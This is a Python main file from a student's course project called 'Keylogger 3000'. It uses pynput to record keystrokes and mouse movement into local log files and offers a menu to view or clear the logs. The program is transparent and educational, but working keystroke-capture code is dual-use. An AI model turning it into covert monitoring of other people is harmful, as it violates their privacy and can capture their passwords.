"""
Sadia Plimley
CIS-30A Summer 2025
Final Project: Keylogger
Program Purpose: To monitor all user inputs on their device
and track them in a file. Additionally, organize the data to show statistics
on the user's inputs
 ----- main file
"""

import threading #modules and libraries
import keylog_control
import keylog_mouse
from pynput import keyboard, mouse

# Start keyboard listener
def start_keyboard():
    with keyboard.Listener(on_press=keylog_control.writeToLog) as listener:
        listener.join()

# Start mouse listener
def start_mouse():
    with mouse.Listener(on_move=keylog_mouse.writetomog) as listener:
        listener.join()

# Start both listeners in parallel
threading.Thread(target=start_keyboard, daemon=True).start()
threading.Thread(target=start_mouse, daemon=True).start()

# Display welcome message
print("Welcome to the Keylogger 3000! We have designed a state of the art")
print("keylogger for your enjoyment and education! It's important to note that")
print("The keylogger is already on! It was that easy. As long as this program is")
print("running, we will be monitoring your device and tracking everything you type/do")
print("In the meantime, explore the web! Text your friends! Our program")
print("will be here waiting and you can see our logs whenever you want.")

# Define command functionality
class Run:
    def display(self, log):
        print(f"\n--- Displaying {log} ---")
        try:
            with open(log, "r") as f:
                print(f.read())
        except FileNotFoundError:
            print(f"{log} not found.")

    def clear_logs(self):
        with open("log.txt", 'w'), open("mog.txt", 'w'): # put in w mode to clear all text
            pass
        print("Your logs have been cleared!")

    def mouse_tp(self):
        keylog_control.ctrl_mouse()# moves mouse to random location
        print("Mouse teleportation executed.")

# Command menu
commands = {
    "A": "Display Keyboard Log",
    "B": "Clear Logs",
    "C": "Display Mouse Log",
    "D": "Mouse Teleportation",
    "E": "Kill Program"
}

print("\nCommand Menu:")
for k, v in commands.items(): #prints out all commands for user
    print(f"{k}: {v}")

# Command loop
run = Run()
while True:
    choice = input("\nWhich command would you like to run? ").strip().upper() #make uppercase
    if choice == "A": #if a, run display function
        run.display("log.txt")
    elif choice == "B": #if b, run clear log
        run.clear_logs()
    elif choice == "C": #if c, run display mog
        run.display("mog.txt")
    elif choice == "D":
        run.mouse_tp() #if d, run mouse teleportation
    elif choice == "E":
        print("Exiting program...")
        break #end program 
    else:
        print("Invalid input. Please choose A, B, C, D, or E.")



""" 

Program runs as follows :

- turn on keylogger + keycounter 
- say hi to user, explain everything, tell them to do stuff w their laptop
- give list* of commands (display log.txt, clear log.txt, display mog.txt,
kill program), get input response & use error detection there

"""

